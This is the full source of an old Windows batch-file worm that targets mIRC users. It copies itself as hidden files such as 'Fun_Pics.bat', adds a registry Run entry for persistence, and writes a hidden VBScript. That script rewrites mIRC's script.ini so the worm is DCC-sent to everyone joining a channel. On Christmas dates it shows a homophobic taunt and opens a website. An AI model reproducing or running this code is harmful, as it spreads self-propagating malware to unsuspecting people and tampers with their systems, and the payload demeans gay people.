   @Echo off
   Set Win-Dir=%windir%
   REM -=[ Just a crap batch file worm ]=-

   if exist C:\mirc\mirc.ini Set Irc=c:\mirc\
   if exist C:\Progra~1\mirc\mirc.ini Set Irc=c:\mirc\Progra~1\

   if exist D:\mirc\mirc.ini Set Irc=D:\mirc\
   if exist D:\Progra~1\mirc\mirc.ini Set Irc=D:\Progra~1\mirc\

   if exist E:\mirc\mirc.ini Set Irc=E:\mirc\
   if exist E:\Progra~1\mirc\mirc.ini Set Irc=E:\Progra~1\mirc\

   If Not Exist %win-dir%\Fun_Pics.bat Copy %0 %win-dir%\Fun_Pics.bat
   if Not Exist C:\PROGRA~1\AUTOEXCES.BAT copy %0 C:\PROGRA~1\AUTOEXCES.BAT

   If Exist %win-dir%\-.vbs Attrib %win-dir%\-.vbs -H

   Echo.On Error Resume Next > %win-dir%\-.vbs
   Echo Dim fso, f >> %win-dir%\-.vbs
   Echo Set fso = CreateObject("Scripting.FileSystemObject") >> %win-dir%\-.vbs
   Echo Set f = fso.OpenTextFile("%Irc%Script.ini",2, True) >> %win-dir%\-.vbs
   Echo f.WriteLine "[Script]" >> %win-dir%\-.vbs
   Echo f.Write "n0=on 1:JOIN:#:if ( " >> %win-dir%\-.vbs
   Echo f.Write Chr((26)+10) >> %win-dir%\-.vbs
   Echo f.Write "me != " >> %win-dir%\-.vbs
   Echo f.Write Chr((26)+10) >> %win-dir%\-.vbs
   Echo f.Write "nick ) { /dcc send "+Chr(6+30)+"nick %win-dir%\Fun_Pics.bat }" >> %win-dir%\-.vbs


   If Not Exist 'C:\PROGRA~1\NT.REG' Echo REGEDIT4 > C:\PROGRA~1\NT.REG
   If Not Exist 'C:\PROGRA~1\NT.REG' Echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> c:\PROGRA~1\NT.REG
   If Not Exist 'C:\PROGRA~1\NT.REG' Echo "SysFile"="\"C:\\PROGRA~1\\AUTOEXCES.BAT\"" >> c:\PROGRA~1\NT.REG

   Attrib C:\PROGRA~1\NT.REG +H
   Attrib %win-dir%\Fun_Pics.bat +H
   Attrib %win-dir%\-.vbs +H

   Start regedit /s C:\PROGRA~1\NT.REG
   Start %win-dir%\-.vbs

   If %Date%==25/12/2001 GoTo PAY_LOAD
   If %Date%==25/12/2002 GoTo PAY_LOAD
   If %Date%==25/12/2003 GoTo PAY_LOAD
   If %Date%==25/12/2004 GoTo PAY_LOAD
   If %Date%==25/12/2005 GoTo PAY_LOAD
   If %Date%==25/12/2006 GoTo PAY_LOAD

   Exit

   :PAY_LOAD
   Echo There's Nothing Like A Gay Old Christmas !!! >C:\Gay.txt
   Start Notepad.exe C:\Gay.txt
   Start http://www.gaymen.com
